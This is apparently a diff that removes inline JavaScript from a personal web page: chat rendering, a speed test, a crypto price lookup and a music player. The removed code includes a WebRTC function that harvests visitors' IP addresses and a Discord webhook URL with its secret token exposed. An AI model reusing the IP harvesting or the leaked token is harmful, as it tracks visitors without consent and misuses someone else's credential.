-if(res[0].data.links.length === res_length) return
-res_length = res[0].data.links.length
-chat_amount = res[0].data.links.length > 15 ? res[0].data.links.length - 15 : 0
-for(let i = chat_amount; i < res[0].data.links.length; i++) {
-link = res[0].data.links[i]
-p_element(`${link.comment.replace("\n", " ").replace(/<[@:\w\d]+>/g, "")}`, posts_div, `${link.user.replace(" 🐢", "")}:`)
-if(link.image) img_element(link.image, posts_div) }
-posts.replaceChildren(posts_div) }
-
-keyboard_events = ["z"]
-window.addEventListener("keydown", e => { if(!keyboard_events.includes(e.key)) return; document.getElementById(e.key).style.visibility = "hidden" })
-window.addEventListener("keyup", e => { if(!keyboard_events.includes(e.key)) return; keyboard_events.forEach(temp_key => document.getElementById(temp_key).style.visibility = "visible") })
-
-keyboard_events.forEach(temp_key => keyboard_press(temp_key))
-function keyboard_press(key) { btn = document.getElementById(key)
-btn.addEventListener("touchstart", () => window.dispatchEvent(new KeyboardEvent("keydown", {"key": key})))
-btn.addEventListener("touchend", () => window.dispatchEvent(new KeyboardEvent("keyup", {"key": key}))) }
-
-const auto_resize_docs = document.getElementsByClassName("auto_resize")
-for(let i = 0; i < auto_resize_docs.length; i++) {
-auto_resize_docs[i].setAttribute("style", "height: " + (auto_resize_docs[i].scrollHeight) + "px; overflow-y: hidden;")
-auto_resize_docs[i].addEventListener("input", on_input, false) }
-function on_input() { this.style.height = 0
-this.style.height = (this.scrollHeight) + "px" }
-
-function discord_webhook(message) {
-req = new XMLHttpRequest()
-req.open("POST", "https://discord.com/api/webhooks/1005744977801912450/SRhxYTMUkIr3j4mjA-Ib9lzaIHG7u-lkyrZXd1DKuPT3JJzsS9gsmdxz6BUZtgd8Y4pm")
-req.setRequestHeader("Content-Type", "application/json")
-req.send(JSON.stringify({ "username": "Ishkafel", "content": message, "avatar_url": "https://media.discordapp.net/attachments/1002059651690528860/1026859531206131752/IMG_20221004_221117.jpg" })) }
-
-function get_user_ip(new_temp_ip) {
-peer_connection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection
-pc = new peer_connection({ iceServers: [] })
-noop = function() {}
-local_ips = {}
-ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g
-let ip_key
-function iterate_ip(ip) {
-if(!local_ips[ip]) new_temp_ip(ip)
-local_ips[ip] = true }
-pc.createDataChannel("")
-pc.createOffer(function(sdp) { //pc.createOffer().then(function(sdp) {
-sdp.sdp.split("\n")
-.forEach(function(line) {
-if(line.indexOf("candidate") < 0) return
-line.match(ip_regex).forEach(iterate_ip) })
-pc.setLocalDescription(sdp, noop, noop)
-}, noop) //}).catch(function(reason) { alert("error") })
-pc.onicecandidate = function(ice) {
-if(!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ip_regex)) return
-ice.candidate.candidate.match(ip_regex).forEach(iterate_ip) } }
-
-function speedtest_show_progress(message) {
-if(progress) { progress.innerHTML = (typeof message === "string") ? message : message.join("<br>") } }
-function speedtest_init() {
-speedtest_show_progress("Loading...")
-window.setTimeout(speedtest, 1) }
-function speedtest() {
-let start_time, end_time
-download = new Image()
-download.onload = function () {
-end_time = (new Date()).getTime()
-speedtest_result() }
-download.onerror = function (err, msg) {
-speedtest_show_progress("No Data") }
-start_time = (new Date()).getTime()
-cacheBuster = "?nnn=" + start_time
-download.src = global_url + cacheBuster
-function speedtest_result() {
-duration = (end_time - start_time) / 1000
-bits_loaded = file_size * 8
-speed_bps = (bits_loaded / duration).toFixed(2)
-speed_kbps = (speed_bps / 1024).toFixed(2)
-speed_mbps = (speed_kbps / 1024).toFixed(2)
-speedtest_show_progress([speed_mbps + " MBPS"]) } }
-
-function binance_search(query) {
-axios.get(`https://api.binance.com/api/v3/ticker/24hr?symbol=${query || 'BTC'}USDT`)
-.then(res => crypto_position.innerHTML = `${res.data.symbol.split("USDT")[0]} | ${parseFloat(res.data.lastPrice).toFixed(2)} | ${parseFloat(res.data.priceChangePercent).toFixed(2)}%`) }
-
-mode_selector.onchange = event => {
-if(event.target.value.toLowerCase() === "nightmode") {
-body.style.color = "white"
-body.style.backgroundColor = "black"
-} else {
-body.style.color = "black"
-body.style.backgroundColor = "white" } }
-
-music_player_showed = true
-music_list = [
-{ name: "Fujii Kaze - Yasashisa", id: "a", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089115948318986280/Fujii_Kaze_-_YASASHISA.mp3" },
-{ name: "Fujii Kaze - Kaerou", id: "b", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089115947610148934/Fujii_Kaze_-_Kaerou.mp3" },
-{ name: "Fujii Kaze - Shinunoga E-Wa", id: "c", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089115947941494864/Fujii_Kaze_-_Shinunoga_E-Wa.mp3" },
-{ name: "Fujii Kaze - Matsuri", id: "d", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089180079164248115/Fujii_Kaze_-_Matsuri.mp3" },
-{ name: "Fujii Kaze - Tsumi No Kaori", id: "e", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089181706881355796/Fujii_Kaze_-_Tsumi_No_Kaori.mp3" },
-{ name: "Imase - Night Dancer", id: "f", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089216865559126106/imase_-_NIGHT_DANCER.mp3" },
-{ name: "Kenshi Yonezu - Lemon", id: "g", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1089359214117404714/Kenshi_Yonezu_-_Lemon.mp3" },
-{ name: "Kenshi Yonezu - Metronome", id: "h", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618372661727303/-__Kenshi_Yonezu_-_Metronome.m4a" },
-{ name: "Kenshi Yonezu - Loser", id: "i", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618370589728848/Kenshi_Yonezu_-_Loser.mp3" },
-{ name: "Kenshi Yonezu - Shunrai", id: "j", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618370912702544/Kenshi_Yonezu_-_Shunrai.mp3" },
-{ name: "Kenshi Yonezu - Uma to Shika", id: "k", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618371252424785/Kenshi_Yonezu_-_Uma_to_Shika.mp3" },
-{ name: "Kenshi Yonezu - Orion", id: "l", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618371705425940/Kenshi_Yonezu_-_Orion.mp3" },
-{ name: "Kenshi Yonezu - Eine Kleine", id: "m", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618372380696586/-__Kenshi_Yonezu_-_Eine_Kleine.m4a" },
-{ name: "Kenshi Yonezu - Haiiro to Ao", id: "n", src: "https://cdn.discordapp.com/attachments/1063507461748830289/1090618372028371014/Kenshi_Yonezu_-_Haiirotoao__Masaki_Suda_.mp3" }
-]
-
-last_music = ""
-function play_music(music) {
-if(!music) music = music_list[Math.floor(Math.random() * music_list.length)].name
-if(music === last_music) return
-last_music = music
-div = document.createElement("div")
-music_list.forEach(temp_music => {
-if(temp_music.name.toLowerCase().includes(music.toLowerCase())) {
-global_url = temp_music.src
-p_element(temp_music.name)
-audio_element(temp_music.src) } })
-music_position.replaceChildren(div)
-audio.onended = () => {
-play_music(music_list[Math.floor(Math.random() * music_list.length)].name)
-audio.play() } }
-
-function on_submit(e) { e.preventDefault() }
-
-function p_element(text, base, user) {
-if(!base) base = div
-temp_div = document.createElement("div")
-if(user) {
-b = document.createElement("b")
-b.innerText = user
-temp_div.appendChild(b) }
-p = document.createElement("span")
-p.innerText = text
-temp_div.appendChild(p)
-temp_div.style.display = "block"
-base.prepend(temp_div) }
-
-function a_element(link) {
-a = document.createElement("a")
-a.innerText = "[" + link + "]"
-a.setAttribute("target", "_blank")
-a.setAttribute("rel", "noopener noreferrer")
-a.setAttribute("href", link)
-p.appendChild(a) }
-
-function img_element(link, base) {
-if(!base) base = div
-a = document.createElement("a")
-img = document.createElement("img")
-img.src = link
-a.appendChild(img)
-a.setAttribute("target", "_blank")
-a.setAttribute("rel", "noopener noreferrer")
-a.setAttribute("href", link)
-base.prepend(a) }
-
-function audio_element(link) {
-audio = document.createElement("audio")
-source = document.createElement("source")
-source.src = link
-source.type = "audio/ogg" || "audio/mpeg"
-audio.appendChild(source)
-audio.setAttribute("controls", "controls")
-div.appendChild(audio) }
-
-function video_element(link) {
-video = document.createElement("video")
-source = document.createElement("source")
-source.src = link
-source.type = "video/ogg" || "video/webm" || "video/mp4"
-video.appendChild(source)
-video.setAttribute("controls", "controls")
-div.appendChild(video) }
-
-function iframe_element(link) {
-iframe = document.createElement("iframe")
-iframe.src = link
-iframe.setAttribute("allow", "fullscreen")
-div.appendChild(iframe) }</script><button><a id="down" href="#up">Up</a></button>
+</script>
